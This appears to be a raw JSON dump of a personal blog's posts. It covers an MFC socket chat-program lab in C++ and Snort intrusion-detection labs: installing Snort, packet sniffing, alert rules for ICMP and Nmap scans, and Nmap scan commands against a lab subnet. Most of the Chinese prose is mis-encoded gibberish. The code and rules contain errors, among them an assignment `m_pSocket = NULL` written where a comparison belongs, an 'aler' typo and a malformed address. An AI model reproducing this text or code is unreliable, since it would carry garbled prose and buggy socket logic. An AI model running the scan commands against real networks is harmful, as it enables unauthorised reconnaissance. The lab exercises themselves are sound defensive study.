CTcDlg::OnDestroy()&#123; CDialog::OnDestroy(); if ((m_pSocket != NULL) &amp;&amp; (m_pFile != NULL) &amp;&amp; (m_pArchiveOut != NULL)) &#123; CMsg msg; CString strTemp; strTemp = (_T(&quot;DDDDï¼šç¦»å¼€èŠå¤©å®¤ï¼&quot;)); msg.m_bClose = TRUE; msg.m_strBuf = m_strCName + strTemp; msg.Serialize(*m_pArchiveOut); m_pArchiveOut-&gt;Flush(); &#125; delete m_pArchiveOut; m_pArchiveOut = NULL; delete m_pArchiveIn; m_pArchiveIn = NULL; delete m_pFile; m_pFile = NULL; if (m_pSocket != NULL) &#123; BYTE Buffer[50]; m_pSocket-&gt;ShutDown(); while (m_pSocket-&gt;Receive(Buffer, 50) &gt; 0); &#125; delete m_pSocket; m_pSocket = NULL;&#125;void CTcDlg::OnReceive()&#123; do &#123; ReceiveMsg(); if (m_pSocket = NULL) return; &#125; while (!m_pArchiveIn-&gt;IsBufferEmpty());&#125;void CTcDlg::ReceiveMsg()&#123; CMsg msg; TRY &#123; msg.Serialize(*m_pArchiveIn); m_listMsg.AddString(msg.m_strBuf); &#125; CATCH(CFileException, e) &#123; CString strTemp; strTemp = (_T(&quot;æœåŠ¡å™¨é‡ç½®è¿æ¥ï¼è¿æ¥å…³é—­ï¼&quot;)); m_listMsg.AddString(strTemp); msg.m_bClose = TRUE; m_pArchiveOut-&gt;Abort(); delete m_pArchiveIn; m_pArchiveIn = NULL; delete m_pArchiveOut; m_pArchiveOut = NULL; delete m_pFile; m_pFile = NULL; delete m_pSocket; m_pSocket = NULL; &#125; END_CATCH&#125;void CTcDlg::SendMsg(CString&amp; strText, bool st)&#123; if (m_pArchiveOut != NULL) &#123; CMsg msg; msg.m_strBuf = strText; msg.m_bClose = st; msg.Serialize(*m_pArchiveOut); m_pArchiveOut-&gt;Flush(); &#125;&#125; æ•°æ®ä¼ è¾“åºåˆ—åŒ–å¤„ç†ç±»CMsgå¯¹åº”æ–‡ä»¶æœåŠ¡å™¨ç«¯ï¼š âœï¸Msg.h 1234567891011121314151617181920#pragma once// CMsg å‘½ä»¤ç›®æ ‡class CMsg : public CObject&#123; DECLARE_DYNCREATE(CMsg);public: CMsg(); virtual ~CMsg();public: CString m_strText; BOOL m_bClose;public: virtual void Serialize(CArchive&amp;ar);&#125;; âœï¸Msg.cpp 12345678910111213141516171819202122232425262728293031323334353637// CMsg.cpp: å®ç°æ–‡ä»¶//#include &quot;pch.h&quot;#include &quot;ts.h&quot;#include &quot;Msg.h&quot;// CMsgCMsg::CMsg()&#123; m_strText = _T(&quot;&quot;); m_bClose = FALSE;&#125;void CMsg::Serialize(CArchive &amp; ar)&#123; if (ar.IsStoring()) &#123; ar &lt;&lt; (WORD)m_bClose; ar &lt;&lt; m_strText; &#125; else &#123; WORD wd; ar &gt;&gt; wd; m_bClose = (BOOL)wd; ar &gt;&gt; m_strText; &#125;&#125;CMsg::~CMsg()&#123;&#125;IMPLEMENT_DYNAMIC(CMsg,CObject) å®¢æˆ·ç«¯ï¼š âœï¸Msg.h 123456789101112131415#pragma once#include &lt;afx.h&gt;class CMsg : public CObject&#123; DECLARE_DYNCREATE(CMsg);public: CMsg(); virtual ~CMsg(); virtual void Serialize(CArchive&amp; ar); CString m_strBuf; BOOL m_bClose;&#125;; âœï¸Msg.cpp 123456789101112131415161718192021222324252627#include &quot;pch.h&quot;#include &quot;Msg.h&quot;CMsg::CMsg() &#123; m_strBuf = _T(&quot;&quot;); m_bClose = FALSE;&#125;void CMsg::Serialize(CArchive&amp; ar)&#123; if (ar.IsStoring()) &#123; ar &lt;&lt; (WORD)m_bClose; ar &lt;&lt; m_strBuf; &#125; else &#123; WORD wd; ar &gt;&gt; wd; m_bClose = (BOOL)wd; ar &gt;&gt; m_strBuf; &#125;&#125;CMsg::~CMsg()&#123;&#125;IMPLEMENT_DYNAMIC(CMsg,CObject) å®éªŒç•Œé¢ç»“æœå±•ç¤º å®éªŒè¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜â›”ï¸åœ¨Msg.hä¸­å£°æ˜äº†ææ„å‡½æ•°ï¼Œä½†cppä¸­æ²¡æœ‰å®šä¹‰ ğŸ’šåœ¨Msg.cppä¸­è¡¥ä¸Šææ„å‡½æ•°çš„å®šä¹‰ â›”ï¸ å­—ç¬¦é—®é¢˜ 1strTemp = m_strCName + &quot;ï¼šè¿›å…¥èŠå¤©å®¤&quot;; ğŸ’šåœ¨å­—ç¬¦ä¸²å‰é¢ï¼ŒåŠ ä¸Š_T 1strTemp = m_strCName + (_T(&quot;ï¼šè¿›å…¥èŠå¤©å®¤&quot;)); å®éªŒå‚è€ƒä¹¦æœåŠ¡å™¨ç«¯ å®¢æˆ·ç«¯","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"å®éªŒ/ç½‘ç»œç¼–ç¨‹","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"MFC","slug":"MFC","permalink":"https://gryffinbit.top/tags/MFC/"},{"name":"WinSock","slug":"WinSock","permalink":"https://gryffinbit.top/tags/WinSock/"},{"name":"CSocket","slug":"CSocket","permalink":"https://gryffinbit.top/tags/CSocket/"}],"author":"Gryffinbit"},{"title":"kaliä¸‹snortæŠ¥è­¦è§„åˆ™è®¾è®¡å’Œæµ‹è¯•","slug":"kaliä¸‹snortæŠ¥è­¦è§„åˆ™è®¾è®¡å’Œæµ‹è¯•","date":"2020-11-30T22:38:23.000Z","updated":"2024-11-12T06:59:33.000Z","comments":true,"path":"2020/12/01/kaliä¸‹snortæŠ¥è­¦è§„åˆ™è®¾è®¡å’Œæµ‹è¯•/","permalink":"https://gryffinbit.top/2020/12/01/kali%E4%B8%8Bsnort%E6%8A%A5%E8%AD%A6%E8%A7%84%E5%88%99%E8%AE%BE%E8%AE%A1%E5%92%8C%E6%B5%8B%E8%AF%95/","excerpt":"","text":"snortæŠ¥è­¦è§„åˆ™è®¾è®¡å’Œæµ‹è¯•snortç®€å•çš„æŠ¥è­¦è§„åˆ™åœ¨å®˜ç½‘ä¸‹è½½è§„åˆ™åŒ…ï¼ˆéœ€è¦æ³¨å†Œç™»é™†ï¼‰https://www.snort.org/downloads æˆ‘ä¸‹è½½çš„æ˜¯29151ç‰ˆæœ¬çš„ å°†snortå®‰è£…ç›®å½•çš„åŒ…ç”¨è§„åˆ™åŒ…è¿›è¡Œæ›¿æ¢ æ›¿æ¢åˆ°snort-2.9.17æ–‡ä»¶å¤¹å†… ç»ƒä¹ ä¸€æ¡è§„åˆ™ğŸ‘‰åœ¨rules&#x2F;local.rulesä¸‹è¿›è¡Œè§„åˆ™é…ç½®ã€‚å®ç°å¯¹å†…ç½‘çš„ICMPç›¸å…³æµé‡è¿›è¡Œæ£€æµ‹ï¼Œå¹¶æŠ¥è­¦ ç¼–è¾‘æ–‡ä»¶çš„æ—¶å€™éƒ½é‡‡ç”¨vimçš„æ–¹å¼ vim &lt;æ–‡ä»¶è·¯å¾„&gt; ä»¥ä¸‹æ“ä½œéƒ½åœ¨snortçš„æ–‡ä»¶å¤¹å†…å®Œæˆã€‚ cd &#x2F;snort-2.9.17 æŠŠä¸‹é¢çš„å†…å®¹æ·»åŠ åˆ°local.rulesé‡Œ 1vim rules/local.rules 1alert icmp any any -&gt; 172.16.68.139 any (msg:&quot;ICMP&quot;;sid:41409) æµ‹è¯•è§„åˆ™ï¼Œçœ‹æ˜¯å¦æœ‰æŠ¥é”™ å°çŒªçŒªè·‘å‡ºæ¥ï¼ŒæˆåŠŸè¿è¡Œ 1snort -c rules/local.rules -T åˆ©ç”¨Snortæ£€æµ‹pingæ”»å‡»åœ¨rules&#x2F;icmp-info.rulesæ–‡ä»¶ä¸­è®¾ç½®å¦‚ä¸‹è§„åˆ™ï¼š 1alert icmp any any -&gt; 172.16.68.139 any (msg:&quot;ICMP Large ICMP Packet&quot;;dsize:&gt;800;reference:arachoids,246; sid:499;rev:4;) tipï¼šå®˜æ–¹æ–‡æ¡£ï¼šThis configuration file enables active response, to run snort in test mode -T you are required to supply an interface -i or test mode will fail to fully validate the configuration and exit with a FATAL error æ£€éªŒè§„åˆ™æ˜¯å¦æŠ¥é”™ï¼š 1snort -c rules/icmp-info.rules -T å¼€å¯æ£€æµ‹æ¨¡å¼ 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ â›”ï¸æŠ¥é”™ï¼šInvalid keyword â€˜preprocessorâ€™ å®˜ç½‘ä¸‹è½½çš„é…ç½®æ–‡ä»¶ï¼Œé»˜è®¤æŠŠpreprocessor reputationæ³¨é‡Šæ‰ã€‚æ‰¾åˆ°è¿™è¡Œã€‚çœ‹é…ç½®æ–‡ä»¶ï¼ŒæŠŠpreprocessoræ³¨é‡Šæ‰“å¼€ã€‚ ä¸è®¾ç½®é»‘ç™½åå•ï¼Œå¯ä»¥æŠŠé»‘ç™½åå•æ³¨é‡Šæ‰ã€‚ â—ï¸æ³¨æ„ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼é€—å·é—®é¢˜ï¼ï¼ï¼ï¼åœ¨æ¯ä¸ªé…ç½®çš„æœ€åä¸€è¡Œï¼Œä¸èƒ½æœ‰,\\ã€‚ ä¸ç„¶ä¼šå‡ºç°ç±»ä¼¼è¿™ç§çš„æŠ¥é”™ã€‚è«åå…¶å¦™çš„ï¼Œå¤©çœŸçš„æˆ‘ä¹‹å‰è¿˜è®¤çœŸçš„å»çœ‹äº†å®˜ç½‘é…ç½®ã€‚ã€‚ å†æ¬¡è¿è¡Œç›‘æµ‹æ¨¡å¼ â›”ï¸æŠ¥é”™ï¼šERROR: Perfmonitor: Cannot open base stats file â€œ&#x2F;var&#x2F;snort&#x2F;snort.statsâ€. Fatal Error, Quitting.. ğŸ’šæ‰“å¼€sonrt.confè¿™è¡Œæ³¨é‡Šæ‰ # preprocessor perfmonitor: time 300 file &#x2F;var&#x2F;snort&#x2F;snort.stats pktcnt 10000 æ²¡æœ‰æŠ¥é”™äº†ï¼å°çŒªçŒªè·‘å‡ºæ¥ï¼Œè¿è¡Œå¦‚å¾·èŠ™å·§å…‹åŠ›ä¸€èˆ¬ä¸æ»‘ï½å°½äº«æ„‰æ‚¦ï¼Œçºµäº«ä¸æ»‘ï½ åœ¨å¦ä¸€å°ä¸»æœºä¸Šping snortæ‰€åœ¨ä¸»æœºï¼Œlogä¸‹é¢ä¼šç”Ÿæˆè­¦æŠ¥æ—¥å¿— kali ä¸Šå¼€å¯snortå…¥ä¾µæ£€æµ‹ 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ å¦ä¸€å°ä¸»æœºå»ping ç”Ÿæˆäº†alertè­¦å‘Šæ—¥å¿— æ—¥å¿—å†…è®°å½•çš„å†…å®¹ æ•æ‰å…³é”®å­—Searchè®°å½•æ‰“å¼€Googleç½‘é¡µçš„åŠ¨ä½œğŸ‘‰ç¼–å†™ä¸€ä¸ªè§„åˆ™ï¼Œé€šè¿‡æ•æ‰å…³é”®å­—Searchè®°å½•æ‰“å¼€Googleç½‘é¡µçš„åŠ¨ä½œï¼Œå¹¶å°†ç¬¦åˆè§„åˆ™çš„æ•°æ®åŒ…è¾“å‡ºåˆ°Alertæ–‡ä»¶ä¸­ åœ¨Snortçš„Rulesæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºmyruleæ–‡ä»¶ï¼Œè¾“å…¥å¦‚ä¸‹å†…å®¹ï¼š 1alert tcp any any -&gt; 172.16.68.139 any (msg:&quot;Google Search Query&quot;;content:&quot;search&quot;;nocase; sid:10000001;) sid snort id ,è¿™ä¸ªå…³é”®å­—è¢«ç”¨æ¥è¯†åˆ«snortè§„åˆ™çš„å”¯ä¸€æ€§ã€‚sid çš„èŒƒå›´æ˜¯å¦‚ä¸‹åˆ†é…çš„ï¼š &lt;100 ä¿ç•™åšå°†æ¥ä½¿ç”¨ 100-1000,000 åŒ…å«åœ¨snortå‘å¸ƒåŒ…ä¸­ 1000,000 ä½œä¸ºæœ¬åœ°è§„åˆ™ä½¿ç”¨ msg æ ‡ç¤ºä¸€ä¸ªæ¶ˆæ¯. ä½†æ˜¯è§„åˆ™ä¸­çš„msgä¸èµ·ä½œç”¨ï¼Œsidå’Œmsgçš„å¯¹åº”å…³ç³»æŸ¥é˜…sid-msg.mapã€‚ æ‰€ä»¥è¿™é‡Œè‡ªå®šä¹‰äº†ä¸€ä¸ªsidä¸º10000001. åœ¨Snort.confæ–‡ä»¶ä¸­æ·»åŠ æ–°å»ºçš„è§„åˆ™æ–‡ä»¶ 1include $RULE_PATH/myrule.rules å¼€å¯æ£€æµ‹æ¨¡å¼ã€‚æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥www.google.comåˆ°googleé¡µé¢ã€‚åˆ°Logæ–‡ä»¶å¤¹ä¸‹æŸ¥çœ‹Alertæ–‡ä»¶ï¼Œè§„åˆ™ä¸­çš„å­—ç¬¦ä¸²å·²ç»è¢«è®°å½•äº†ä¸‹æ¥ï¼Œå³SnortæˆåŠŸåœ°æ£€æµ‹åˆ°è½½å…¥Googleç½‘é¡µçš„åŠ¨ä½œï¼Œæ‰€å®šä¹‰çš„è§„åˆ™èµ·åˆ°äº†é¢„æƒ³çš„ä½œç”¨ 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ æ³¨æ„vmä¸­å®¿ä¸»æœºå’Œè™šæ‹Ÿæœºçš„ç½‘ç»œæ¨¡å¼ å°è¯•å®šä¹‰å‡ ä¸ªæ›´ä¸ºå®ç”¨çš„è§„åˆ™ï¼Œå¹¶åœ¨ä½¿ç”¨ä¸­æ£€éªŒå®ƒä»¬çš„æ•ˆæœã€‚ğŸ‘‰åœ¨new.rulesä¸­æ·»åŠ å¦‚ä¸‹3æ¡è§„åˆ™ï¼š 123alert icmp any any -&gt; any any (dsize:0;itype:8;msg:&quot;NMAP PING SCAN&quot;; sid:1000002;)alert tcp any any -&gt; any any (flags:SF;msg:&quot;NMAP SYN FIN SCAN&quot;; sid:1000003; )aler tcp any any -&gt; any any (flags:A;ack:0;msg:&quot;NMAP TCP PING&quot;; sid:1000004) è¿è¡ŒSnortï¼Œåœ¨å±€åŸŸç½‘å¦ä¸€å°ä¸»æœºä¸Šè¿è¡ŒNmapï¼Œå¯¹ä¸»æœºè¿›è¡Œç«¯å£æ‰«æã€‚é¦–å…ˆä½¿ç”¨Nmapçš„-sPé€‰é¡¹è¿›è¡Œpingæ‰«æï¼Œç„¶åä½¿ç”¨-sSé€‰é¡¹çš„SYNæ‰«æï¼Œæœ€åä½¿ç”¨-sAé€‰é¡¹è¿›è¡ŒACKæ‰«æã€‚ nmap -sP 172.16.68.0/24 ping æ‰«æ sudo nmap -sS 172.16.68.0/24 SYNæ‰«æ sudo nmap -sA 172.16.68.0/24 ACKæ‰«æ æ‰«æå®Œæˆåï¼Œå›åˆ°kaliä¸»æœºæŸ¥çœ‹Alertæ–‡ä»¶ã€‚","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å…¥ä¾µæ£€æµ‹ä¸å–è¯","slug":"å®éªŒ/å…¥ä¾µæ£€æµ‹ä¸å–è¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"kaliä¸‹snortç®€å•çš„æŠ¥è­¦è§„åˆ™","slug":"kaliä¸‹snortç®€å•çš„æŠ¥è­¦è§„åˆ™","date":"2020-11-30T22:05:56.000Z","updated":"2024-11-12T06:59:32.000Z","comments":true,"path":"2020/12/01/kaliä¸‹snortç®€å•çš„æŠ¥è­¦è§„åˆ™/","permalink":"https://gryffinbit.top/2020/12/01/kali%E4%B8%8Bsnort%E7%AE%80%E5%8D%95%E7%9A%84%E6%8A%A5%E8%AD%A6%E8%A7%84%E5%88%99/","excerpt":"","text":"snortç®€å•çš„æŠ¥è­¦è§„åˆ™åœ¨å®˜ç½‘ä¸‹è½½è§„åˆ™åŒ…ï¼ˆéœ€è¦æ³¨å†Œç™»é™†ï¼‰https://www.snort.org/downloads æˆ‘ä¸‹è½½çš„æ˜¯29151ç‰ˆæœ¬çš„ å°†snortå®‰è£…ç›®å½•çš„åŒ…ç”¨è§„åˆ™åŒ…è¿›è¡Œæ›¿æ¢ æ›¿æ¢åˆ°snort-2.9.17æ–‡ä»¶å¤¹å†… ç»ƒä¹ ä¸€æ¡è§„åˆ™ğŸ‘‰åœ¨rules&#x2F;local.rulesä¸‹è¿›è¡Œè§„åˆ™é…ç½®ã€‚å®ç°å¯¹å†…ç½‘çš„ICMPç›¸å…³æµé‡è¿›è¡Œæ£€æµ‹ï¼Œå¹¶æŠ¥è­¦ ç¼–è¾‘æ–‡ä»¶çš„æ—¶å€™éƒ½é‡‡ç”¨vimçš„æ–¹å¼ vim &lt;æ–‡ä»¶è·¯å¾„&gt; ä»¥ä¸‹æ“ä½œéƒ½åœ¨snortçš„æ–‡ä»¶å¤¹å†…å®Œæˆã€‚ cd &#x2F;snort-2.9.17 æŠŠä¸‹é¢çš„å†…å®¹æ·»åŠ åˆ°local.rulesé‡Œ 1vim rules/local.rules 1alert icmp any any -&gt; 172.16.68.139 any (msg:&quot;ICMP&quot;;sid:41409) æµ‹è¯•è§„åˆ™ï¼Œçœ‹æ˜¯å¦æœ‰æŠ¥é”™ å°çŒªçŒªè·‘å‡ºæ¥ï¼ŒæˆåŠŸè¿è¡Œ 1snort -c rules/local.rules -T åˆ©ç”¨Snortæ£€æµ‹pingæ”»å‡»åœ¨rules&#x2F;icmp-info.rulesæ–‡ä»¶ä¸­è®¾ç½®å¦‚ä¸‹è§„åˆ™ï¼š 1alert icmp any any -&gt; 172.16.68.139 any (msg:&quot;ICMP Large ICMP Packet&quot;;dsize:&gt;800;reference:arachoids,246; sid:499;rev:4;) tipï¼šå®˜æ–¹æ–‡æ¡£ï¼šThis configuration file enables active response, to run snort in test mode -T you are required to supply an interface -i or test mode will fail to fully validate the configuration and exit with a FATAL error æ£€éªŒè§„åˆ™æ˜¯å¦æŠ¥é”™ï¼š 1snort -c rules/icmp-info.rules -T å¼€å¯æ£€æµ‹æ¨¡å¼ 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ â›”ï¸æŠ¥é”™ï¼šInvalid keyword â€˜preprocessorâ€™ å®˜ç½‘ä¸‹è½½çš„é…ç½®æ–‡ä»¶ï¼Œé»˜è®¤æŠŠpreprocessor reputationæ³¨é‡Šæ‰ã€‚æ‰¾åˆ°è¿™è¡Œã€‚çœ‹é…ç½®æ–‡ä»¶ï¼ŒæŠŠpreprocessoræ³¨é‡Šæ‰“å¼€ã€‚ ä¸è®¾ç½®é»‘ç™½åå•ï¼Œå¯ä»¥æŠŠé»‘ç™½åå•æ³¨é‡Šæ‰ã€‚ â—ï¸æ³¨æ„ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼é€—å·é—®é¢˜ï¼ï¼ï¼ï¼åœ¨æ¯ä¸ªé…ç½®çš„æœ€åä¸€è¡Œï¼Œä¸èƒ½æœ‰,\\ã€‚ ä¸ç„¶ä¼šå‡ºç°ç±»ä¼¼è¿™ç§çš„æŠ¥é”™ã€‚è«åå…¶å¦™çš„ï¼Œå¤©çœŸçš„æˆ‘ä¹‹å‰è¿˜è®¤çœŸçš„å»çœ‹äº†å®˜ç½‘é…ç½®ã€‚ã€‚ å†æ¬¡è¿è¡Œç›‘æµ‹æ¨¡å¼ â›”ï¸æŠ¥é”™ï¼šERROR: Perfmonitor: Cannot open base stats file â€œ&#x2F;var&#x2F;snort&#x2F;snort.statsâ€. Fatal Error, Quitting.. ğŸ’šæ‰“å¼€sonrt.confè¿™è¡Œæ³¨é‡Šæ‰ # preprocessor perfmonitor: time 300 file &#x2F;var&#x2F;snort&#x2F;snort.stats pktcnt 10000 æ²¡æœ‰æŠ¥é”™äº†ï¼å°çŒªçŒªè·‘å‡ºæ¥ï¼Œè¿è¡Œå¦‚å¾·èŠ™å·§å…‹åŠ›ä¸€èˆ¬ä¸æ»‘ï½å°½äº«æ„‰æ‚¦ï¼Œçºµäº«ä¸æ»‘ï½ åœ¨å¦ä¸€å°ä¸»æœºä¸Šping snortæ‰€åœ¨ä¸»æœºï¼Œlogä¸‹é¢ä¼šç”Ÿæˆè­¦æŠ¥æ—¥å¿— kali ä¸Šå¼€å¯snortå…¥ä¾µæ£€æµ‹ 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ å¦ä¸€å°ä¸»æœºå»ping ç”Ÿæˆäº†alertè­¦å‘Šæ—¥å¿— æ—¥å¿—å†…è®°å½•çš„å†…å®¹","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å…¥ä¾µæ£€æµ‹ä¸å–è¯","slug":"å®éªŒ/å…¥ä¾µæ£€æµ‹ä¸å–è¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"kaliä¸‹snortæ•°æ®åŒ…å—…æ¢","slug":"kaliä¸‹snortæ•°æ®åŒ…å—…æ¢","date":"2020-11-30T21:10:04.000Z","updated":"2024-11-12T06:59:31.000Z","comments":true,"path":"2020/12/01/kaliä¸‹snortæ•°æ®åŒ…å—…æ¢/","permalink":"https://gryffinbit.top/2020/12/01/kali%E4%B8%8Bsnort%E6%95%B0%E6%8D%AE%E5%8C%85%E5%97%85%E6%8E%A2/","excerpt":"","text":"kaliä¸‹snortæ•°æ®åŒ…å—…æ¢å¸¸ç”¨çš„å‘½ä»¤ æ˜¾ç¤ºIPå’ŒTCP&#x2F;UDP&#x2F;ICMPåŒ…å¤´ä¿¡æ¯ snort -v æ˜¾ç¤ºåº”ç”¨å±‚çš„æ•°æ®ï¼Œè¾“å‡ºåŒ…å¤´ä¿¡æ¯çš„åŒæ—¶æ˜¾ç¤ºåŒ…çš„æ•°æ®ä¿¡æ¯ snort -vd æ˜¾ç¤ºæ•°æ®é“¾è·¯å±‚çš„ä¿¡æ¯ snort -vde æ›´å¤šå‘½ä»¤å‚è€ƒsnortæ‰‹å†Œhttp://www.kaiyuanba.cn/content/network/snort/Snortman.htm ä»…æ•è·åŒç»„ä¸»æœºå‘å‡ºçš„icmpå›æ˜¾è¯·æ±‚æ•°æ®åŒ…ã€‚sudo snort -v é‡‡ç”¨è¯¦ç»†æ¨¡å¼åœ¨ç»ˆç«¯æ˜¾ç¤ºæ•°æ®åŒ…é“¾è·¯å±‚ã€åº”ç”¨å±‚ä¿¡æ¯sudo snort -vde é»˜è®¤snortæ—¥å¿—è®°å½•æœ€åä¸€çº§ç›®å½•ä¼šä»¥è§¦å‘æ•°æ®åŒ…çš„æºIPå‘½åã€‚å¯ä½¿ç”¨ç»„åˆé”®Ctrl+Cåœæ­¢snortè¿è¡Œã€‚ æŸ¥çœ‹Snortæ—¥å¿—è®°å½•å¦‚æœè¦æŠŠæ‰€æœ‰çš„åŒ…è®°å½•åˆ°ç¡¬ç›˜ä¸Šï¼Œä½ éœ€è¦æŒ‡å®šä¸€ä¸ªæ—¥å¿—ç›®å½•ï¼Œsnortå°±ä¼šè‡ªåŠ¨è®°å½•æ•°æ®åŒ…ï¼š 12345cd snort-2.9.17 # å®šä½åˆ°snortçš„æ–‡ä»¶å¤¹mkdir log # æ–°å»ºä¸€ä¸ªlogç›®å½•ï¼Œç”¨äºå­˜æ”¾æ—¥å¿—snort -vde -l log -h xxx.xxx.x.0/24 # åªå¯¹æœ¬åœ°ç½‘ç»œè¿›è¡Œæ—¥å¿—ï¼Œå‘Šè¯‰snortæŠŠè¿›å…¥Cç±»ç½‘ç»œ&lt;æœ¬åœ°IP&gt;çš„æ‰€æœ‰åŒ…çš„æ•°æ®é“¾è·¯ã€TCP/IPä»¥åŠåº”ç”¨å±‚çš„æ•°æ®è®°å½•åˆ°ç›®å½•logä¸­snort -l log -b #äºŒè¿›åˆ¶çš„æ—¥å¿—æ–‡ä»¶æ ¼å¼ ç½‘ç»œé€Ÿåº¦å¾ˆå¿«ï¼Œæˆ–è€…æƒ³ä½¿æ—¥å¿—æ›´åŠ ç´§å‡‘ä»¥ä¾¿ä»¥åçš„åˆ†æï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨äºŒè¿›åˆ¶çš„æ—¥å¿—æ–‡ä»¶æ ¼å¼ã€‚æ‰€è°“çš„äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶æ ¼å¼å°±æ˜¯tcpdumpç¨‹åºä½¿ç”¨çš„æ ¼å¼ã€‚è¯¥å‘½ä»¤å¯ä»¥æŠŠæ‰€æœ‰çš„åŒ…è®°å½•åˆ°ä¸€ä¸ªå•ä¸€çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ 12ifconfig #æŸ¥çœ‹æœ¬æœºIPsnort -vde -l log -h 172.16.68.139.0/24 # åªå¯¹æœ¬åœ°ç½‘ç»œè¿›è¡Œæ—¥å¿—ã€‚ åœ¨logä¸­æŸ¥çœ‹åˆšåˆšç”Ÿæˆçš„æ—¥å¿— å°†logæ”¾å…¥wiresharkä¸­è¿›è¡ŒæŸ¥çœ‹","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å…¥ä¾µæ£€æµ‹ä¸å–è¯","slug":"å®éªŒ/å…¥ä¾µæ£€æµ‹ä¸å–è¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"kaliå®‰è£…é…ç½®snort","slug":"kaliå®‰è£…é…ç½®snort","date":"2020-11-30T21:02:46.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2020/12/01/kaliå®‰è£…é…ç½®snort/","permalink":"https://gryffinbit.top/2020/12/01/kali%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEsnort/","excerpt":"","text":"kali ä¸‹snortå®‰è£…è½¯ä»¶åŒ…ï¼Œé…ç½®ç¯å¢ƒå®éªŒç¯å¢ƒï¼škali-linux-2020.1 debian8 å®‰è£…snortåŠå…¶ä¾èµ–åŒ…åœ¨å®˜ç½‘ä¸Šä¸‹è½½snort, daq https://www.snort.org/downloads 1234567891011snort-2.9.17.tar.gzdaq-2.0.7.tar.gzè¿›è¡Œå®‰è£…åŒ…è§£å‹ï¼štar -zxvf snort-2.9.17.tar.gztar -zxvf daq-2.0.7.tar.gz å®‰è£…daqæ‰€ä¾èµ–çš„å¼€å‘åŒ… 12345Apt-get install flexApt-get install bisonApt-get install libpcap-dev å¯¹dagåŒ…è¿›è¡Œç¼–è¯‘ 123cd daq-2.0.7./configure &amp;&amp; make &amp;&amp; make install å®‰è£…snortæ‰€ä¾èµ–çš„è½¯ä»¶åŒ… 123456Apt-get isnatll libpcre3-devApt-get install libdumbnet-devApt-get install zlib1g-dev å¯¹snortåŒ…è¿›è¡Œç¼–è¯‘ 123cd snort-2.9.17./configure --enable-sourcefire --disable-open-appid &amp;&amp; make &amp;&amp; sudo make install","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å…¥ä¾µæ£€æµ‹ä¸å–è¯","slug":"å®éªŒ/å…¥ä¾µæ£€æµ‹ä¸å–è¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"kaliå®‰è£…gmpy2","slug":"kaliå®‰è£…gmpy2","date":"2020-11-30T20:00:50.000Z","updated":"2024-11-12T06:59:34.000Z","comments":true,"path":"2020/12/01/kaliå®‰è£…gmpy2/","permalink":"https://gryffinbit.top/2020/12/01/kali%E5%AE%89%E8%A3%85gmpy2/","excerpt":"","text":"kali-å®‰è£…gmpy2å®‰è£…ç¯å¢ƒgcc åŸç‰ˆæœ¬9.2 å®‰è£…gmpåŒ…ï¼š12345wget [https://gmplib.org/download/gmp/gmp-6.2.0.tar.xz](https://gmplib.org/download/gmp/gmp-6.2.0.tar.xz)tar xvf gmp-6.2.0.tar.xzcd gmp-6.2.0./configure --prefix=/usr/local/gmp 